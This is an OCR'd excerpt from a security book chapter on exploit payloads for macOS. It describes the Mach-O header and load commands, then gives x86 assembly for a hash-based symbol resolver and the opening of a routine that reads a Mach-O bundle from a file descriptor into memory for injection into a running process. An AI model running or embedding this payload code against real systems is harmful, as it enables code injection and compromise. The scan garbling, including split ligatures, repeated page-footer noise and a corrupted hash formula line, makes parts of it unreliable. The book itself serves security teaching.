The Mach-O format consists of a Mach-O header followed by a number of
load commands. The header format is shown in Table 9-4. Each load command
that follows the header begins with the same two fi elds, cmd and cmdsize, that
defi ne the type and size of the load command, respectively. Use those fi elds
to iterate over the load commands and fi nd the ones that we are interested
in. To resolve symbols, you need to know about only the LC_SEGMENT and
LC_SYMTAB load commands.
Table 9-4: Mach-O Header Format
OFFSET NAME DESCRIPTION
00 magic Magic number identifying Mach-O format
04 cputype CPU type code
08 cpusubtype Machine type code
0C fi letype Type of Mach-O fi le (executable, dylib, bundle, etc.)
10 ncmds Number of load commands that follow
14 sizeofcmds Size in bytes of all load commands
18 fl ags Flags
The LC_SEGMENT load command given in Table 9-5 describes a segment
from the Mach-O fi le that needs to be loaded in memory. It gives the name,
address, size, offset, and memory protection of that segment. The __LINKEDIT
segment is a special segment that contains the symbol information that you
are after. As you iterate through load commands, there will be multiple LC_
SEGMENT load commands, and you will hash the segname string to fi nd the
9955336633cc0099..iinndddd 224455 11//2255//0099 44::4422::2299 PPMM
246 Part III ■ Exploitation
__LINKEDIT segment. Once you fi nd it, you will record the base virtual address
where the segment is loaded and the fi le offset from which it was loaded.
Table 9-5: LC_SEGMENT Load-Command Format
OFFSET NAME DESCRIPTION
00 cmd Load command type (LC_SEGMENT)
04 cmdsize Size in bytes, including sections that follow
08 segname ASCII string name of segment
18 vmaddr Load address of segment
1C vmsize Size in memory of segment
20 fi leoff File offset where segment begins
24 fi lesize Bytes of fi le to map, starting from fi leoff
28 maxprot Maximum VM protection
2C initprot Initial VM protection
30 nsects Number of sections that follow in segment
34 fl ags Flags
The LC_SYMTAB load command given in Table 9-6 describes where to fi nd
the string and symbol tables within the __LINKEDIT segment. The offsets given
are fi le offsets, so you subtract the fi le offset of the __LINKEDIT segment to
obtain the virtual memory offset of the string and symbol tables. Adding the
virtual memory offset to the virtual-memory address where the __LINKEDIT
segment is loaded will give you the in-memory location of the string and sym-
bol tables.
Table 9-6: LC_SYMTAB Load-Command Format
OFFSET NAME DESCRIPTION
00 cmd Load command type (LC_SYMTAB)
04 cmdsize Size in bytes of load command
08 symoff Symbol table offset within LINKEDIT segment
0C nsyms Number of symbol table entries
10 stroff String table offset within LINKEDIT segment
1C strsize Size in bytes of string table
9955336633cc0099..iinndddd 224466 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 247
In order to resolve a needed symbol into a virtual memory address, the pay-
load component iterates through the array of symbol-table entries, examining
the string name each refers to for a match. Using an actual string comparison
for identifying segment and symbol names would require the entire symbol
names to be embedded in the payloads. This unnecessarily increases the size
of the payloads, especially the early-stage payloads where size defi nitely mat-
ters. Instead, the payload component uses a compact hashing function so that
it can refer to symbols by 32-bit hashes. The hashing function and technique
are based on the Last Stage of Delirium’s Windows Assembly Components.
The hash for a given string is generated by performing the following for each
character c in it.
hash = (hash >> 13) | (hash > 13) | (hash ncmds
mov [ebp-4], eax ; ncmds
add bl, 28 ; Advance ebx to first load command
.loadcmd:
;; Load command loop
xor eax, eax
cmp dword [ebp-4], eax
je .return
inc eax
cmp [ebx], eax
je .segment
inc eax
cmp [ebx], eax
je .symtab
.next_loadcmd:
;; Advance to the next load command
dec dword [ebp-4]
add ebx, [ebx+4]
jmp .loadcmd
.segment:
;; Look for “__TEXT” segment
cmp [ebx+10], dword ‘TEXT’
je .text
;; Look for “__LINKEDIT” segment
cmp [ebx+10], dword ‘LINK’
je .linkedit
jmp .next_loadcmd
.text:
mov eax, [ebx+24]
mov [ebp-8], eax ; save image preferred load address
jmp .next_loadcmd
.linkedit:
;; We have found the __LINKEDIT segment
mov eax, [ebx+24] ; segcmd->vmaddr
sub eax, [ebp-8] ; image preferred load address
add eax, [ebp+8] ; actual image load address
9955336633cc0099..iinndddd 224499 11//2255//0099 44::4422::2299 PPMM
250 Part III ■ Exploitation
sub eax, [ebx+32] ; segcmd->fileoff
mov [ebp-12], eax ; save linkedit segment base
jmp .next_loadcmd
.symtab:
;; Examine LC_SYMTAB load command
mov ecx, [ebx+12] ; ecx = symtab->nsyms
.symbol:
xor eax, eax
cmp ecx, eax
je .return
dec ecx
imul edx, ecx, byte 12 ; edx = index into symbol table
add edx, [ebx+8] ; edx += symtab->symoff
add edx, [ebp-12] ; adjust symoff relative to
linkedit
mov esi, [edx] ; esi = index into string table
add esi, [ebx+16] ; esi += symtab->stroff
add esi, [ebp-12] ; adjust stroff relative to
linkedit
;; hash = (hash >> 13) | ((hash & 0x1fff) << 19) + c
xor edi, edi
cld
.hash:
xor eax, eax
lodsb
cmp al, ah
je .compare
ror edi, 13
add edi, eax
jmp .hash
.compare:
cmp edi, [ebp+12]
jne .symbol
mov eax, [edx+8] ; return symbols[ecx].n_value
sub eax, [ebp-8] ; adjust to actual load address
add eax, [ebp+8]
.return:
pop edi
pop esi
pop ebx
leave
ret 8
9955336633cc0099..iinndddd 225500 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 251
;;; --------------------------------------------------------------------
;;; inject_bundle(int filedes, size_t size)
;;;
;;; Read a Mach-O bundle from the given file descriptor, load and link
;;; it into the currently running process.
;;;
;;; Arguments:
;;; filedes - file descriptor to read() bundle from
;;; size - number of bytes to read from file descriptor
;;; --------------------------------------------------------------------
_inject_bundle:
push ebp
mov ebp, esp
sub esp, byte 8
mov esi, [ebp+8] ; arg0: filedes
.read_size:
;; Read a 4-byte size of bundle to read
xor eax, eax
mov al, 4
push eax ; nbyte
lea edi, [ebp-4]
push edi ; buf
push esi ; s
push eax
dec eax
int 0x80
jb .read_return
add esp, byte 16
cmp eax, ecx ; A zero-read signals termination
je .read_return
mov ecx, [ebp-4]
xor eax, eax
cmp ecx, eax
je .read_return ; A zero value signals termination
jmp .mmap
.read_return:
jmp .return
.mmap:
;; mmap memory
xor eax, eax
push eax
push -1
push (MAP_ANON | MAP_PRIVATE)
push (PROT_READ | PROT_WRITE)
push ecx ; size
push eax
9955336633cc0099..iinndddd 225511 11//2255//0099 44::4422::2299 PPMM
252 Part III ■ Exploitation
push eax ; spacer
mov al, 197
int 0x80
add esp, byte 28
jb .return
mov edi, eax ; memory buffer
mov [ebp-8], edi
;; read bundle from file descriptor into mmap’d buffer
.read_bundle:
xor eax, eax
push ecx ; nbyte
push edi ; buf
push esi ; filedes
push eax ; spacer
mov al, 3
int 0x80
jb .return
add esp, byte 16
add edi, eax
sub ecx, eax
jnz .read_bundle
mov edi, [ebp-8] ; load original memory buffer
;; load bundle from mmap’d buffer
lea eax, [ebp-8]